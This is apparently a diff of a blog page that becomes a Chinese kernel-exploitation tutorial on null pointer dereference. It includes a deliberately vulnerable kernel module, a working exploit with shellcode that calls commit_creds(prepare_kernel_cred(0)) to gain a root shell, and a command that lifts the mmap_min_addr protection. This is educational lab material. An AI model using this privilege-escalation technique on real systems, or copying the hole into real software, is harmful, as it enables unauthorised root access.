@@ -7,20 +7,22 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>标签: IOFILE - Mask&#39;s blogs</title>
+<title>Linux Kernel Pwn Ⅱ：Null Pointer Dereference - Mask&#39;s blogs</title>
 
 
-    <meta name="description" content="a newbie in CTF">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Mask&#39;s blogs">
-<meta property="og:url" content="Mask6asok.github.io/tags/IOFILE/index.html">
+    <meta name="description" content="简单Null Pointer Dereference这个古老的漏洞">
+<meta name="keywords" content="pwn,kernel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Kernel Pwn Ⅱ：Null Pointer Dereference">
+<meta property="og:url" content="Mask6asok.github.io/2020/01/28/Linux-Kernel-Pwn-2.html">
 <meta property="og:site_name" content="Mask&#39;s blogs">
-<meta property="og:description" content="a newbie in CTF">
+<meta property="og:description" content="简单Null Pointer Dereference这个古老的漏洞">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="/images/og_image.png">
+<meta property="og:updated_time" content="2020-02-06T14:35:14.728Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Mask&#39;s blogs">
-<meta name="twitter:description" content="a newbie in CTF">
+<meta name="twitter:title" content="Linux Kernel Pwn Ⅱ：Null Pointer Dereference">
+<meta name="twitter:description" content="简单Null Pointer Dereference这个古老的漏洞">
 <meta name="twitter:image" content="/images/og_image.png">
 
 
@@ -79,7 +81,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.ico" alt="Mask&#39;s blogs" height="28">
+                <img src="/images/logo.ico" alt="Linux Kernel Pwn Ⅱ：Null Pointer Dereference" height="28">
             
             </a>
         </div>
@@ -107,6 +109,10 @@
             <div class="navbar-end">
                 
                 
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
                 
                 <a class="navbar-item search" title="搜索" href="javascript:;">
                     <i class="fas fa-search"></i>
@@ -120,25 +126,14 @@
     <section class="section">
         <div class="container">
             <div class="columns">
-                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
-    <div class="card-content">
-        <nav class="breadcrumb" aria-label="breadcrumbs">
-        <ul>
-            <li><a href="/tags">标签</a></li>
-            <li class="is-active"><a href="#" aria-current="page">IOFILE</a></li>
-        </ul>
-        </nav>
-    </div>
-</div>
-
-    
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
 <div class="card">
     
     <div class="card-content article ">
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-12-15T13:55:22.154Z">2019-12-15</time>
+                <time class="level-item has-text-grey" datetime="2020-01-28T08:58:15.884Z">2020-01-28</time>
                 
                 <div class="level-item">
                 <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
@@ -148,7 +143,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    13 分钟 读完 (大约 1894 个字)
+                    4 分钟 读完 (大约 619 个字)
                 </span>
                 
                 
@@ -157,21 +152,44 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                <a class="has-link-black-ter" href="/2019/12/15/2019 Nu1LCTF warmup + babypwn.html">2019 Nu1lCTF warmup + babypwn</a>
+                Linux Kernel Pwn Ⅱ：Null Pointer Dereference
             
         </h1>
         <div class="content">
-            <p>2019 Nu1lCTF warmup , babypwn wp</p>
+            <p>简单Null Pointer Dereference这个古老的漏洞</p>
+<a id="more"></a>
+<p>空指针解引用类漏洞是比较早的一类漏洞，问题在于某些指针未经初始化验证直接使用，导致执行0地址处指令</p>
+<p>若是在用户程序中申请0地址处执行，赋予可执行权限，并写入shellcode，则劫持执行流</p>
+<p>写一个demo来说明这个漏洞</p>
+<h1 id="Vul-LKM"><a href="#Vul-LKM" class="headerlink" title="Vul LKM"></a>Vul LKM</h1><p>KVM模块null_pointer.c内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*my_funptr)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">null_pointer_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    my_funptr(); <span class="comment">// 未经验证直接调用</span></span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">null_pointer_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"null_pointer driver init!\n"</span>);</span><br><span class="line">    create_proc_entry(<span class="string">"null_pointer"</span>, <span class="number">0666</span>, <span class="number">0</span>)-&gt;write_proc = null_pointer_write;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">null_pointer_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"null_pointer driver exit\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(null_pointer_init);</span><br><span class="line">module_exit(null_pointer_exit);</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>pwn.c文件内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x48\xc7\xc7\x0\x0\x0\x0\x48\xc7\xc0\x40\x17\x8\x81\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x50\x15\x8\x81\xff\xd0\xc3"</span>; <span class="comment">// shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/null_pointer"</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Run shellcode..."</span>);</span><br><span class="line">    write(fd, <span class="string">"Mask"</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get root."</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意这里需要在rootfs中的init文件加这一句，取消<code>mmap_min_addr</code>的限制，否则无法在用户程序中申请到0地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w vm.mmap_min_addr="0"</span><br></pre></td></tr></table></figure>
+<p>编译后打包<code>rootfs.cpio</code>，运行起来，dbg附加上去，在<code>bug1_write</code>函数下断点，可以看到在LKM执行<code>my_funptr()</code>时，由于函数指针未初始化，因而执行0地址处的指令</p>
+<p><img src="https://i.loli.net/2020/01/28/BizQOolquZWCjwa.png" alt="1580049867176.png"></p>
+<p>由于在<code>pwn.c</code>中使用<code>mmap</code>与<code>memcpy</code>往此地址写入了shellcode，所以就是执行shellcode</p>
+<p><img src="https://i.loli.net/2020/01/28/U4XZvEK2dD5Bboq.png" alt="1580050098336.png"></p>
+<p>这段shellcode的意思是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,0</span><br><span class="line">mov rax,0xffffffff81081740</span><br><span class="line">call rax</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rax,0xffffffff81081550</span><br><span class="line">call rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">/ # grep commit_creds /proc/kallsyms            </span><br><span class="line">ffffffff81081550 T commit_creds                 </span><br><span class="line">......      </span><br><span class="line">/ # grep prepare_kernel_cred /proc/kallsyms     </span><br><span class="line">ffffffff81081740 T prepare_kernel_cred          </span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>也就是执行<code>commit_creds(prepare_kernel_cred(0))</code>后返回，然后在<code>pwn.c</code>中执行了<code>system(&quot;/bin/sh&quot;)</code>，就相当于以root权限起了一个shell</p>
+<p>用一个普通用户尝试，在rootfs中的init文件加入<code>setsid cttyhack setuidgid 1000 sh</code>即可以非roo启动</p>
+<p><img src="https://i.loli.net/2020/01/28/3rSgMmZKEDx6XJH.png" alt="1580038752682.png"></p>
+<h1 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h1><p>NULL_Pointer_Dereference：链接: <a href="https://pan.baidu.com/s/1nH3CCL9oSIHg3PnF8h_6oA">https://pan.baidu.com/s/1nH3CCL9oSIHg3PnF8h_6oA</a> 提取码: dztb</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://pwn4.fun/2017/04/19/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89NULL-Pointer-Dereference/">BruceFan ‘s Blog</a></p>
+
         </div>
         
-        
-        <div class="level is-mobile">
+        <div class="level is-size-7 is-uppercase">
             <div class="level-start">
                 <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/12/15/2019 Nu1LCTF warmup + babypwn.html#more">阅读更多</a>
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/kernel/">kernel</a>, <a class="has-link-grey -link" href="/tags/pwn/">pwn</a>
                 </div>
             </div>
         </div>
+        
         
         
     </div>
@@ -181,7 +199,26 @@
 
 
 
-
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2020/02/06/Linux-Kernel-Pwn-1.html">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">Linux Kernel Pwn Ⅰ：Basic Knowledge</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/01/10/arm_ret2dlresolve.html">
+                <span class="level-item">记一次arm架构的ret to dl_resolve</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
 
 
 </div>
@@ -193,6 +230,34 @@
 <div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left is-sticky">
     
         
+
+    <div class="card widget" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#Vul-LKM">
+        <span class="has-mr-6">1</span>
+        <span>Vul LKM</span>
+        </a></li><li>
+        <a class="is-flex" href="#Exploit">
+        <span class="has-mr-6">2</span>
+        <span>Exploit</span>
+        </a></li><li>
+        <a class="is-flex" href="#Attachment">
+        <span class="has-mr-6">3</span>
+        <span>Attachment</span>
+        </a></li><li>
+        <a class="is-flex" href="#Reference">
+        <span class="has-mr-6">4</span>
+        <span>Reference</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
     
         
 <div class="card widget">
@@ -638,7 +703,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.ico" alt="Mask&#39;s blogs" height="28">
+                    <img src="/images/logo.ico" alt="Linux Kernel Pwn Ⅱ：Null Pointer Dereference" height="28">
                 
                 </a>
                 <p class="is-size-7">
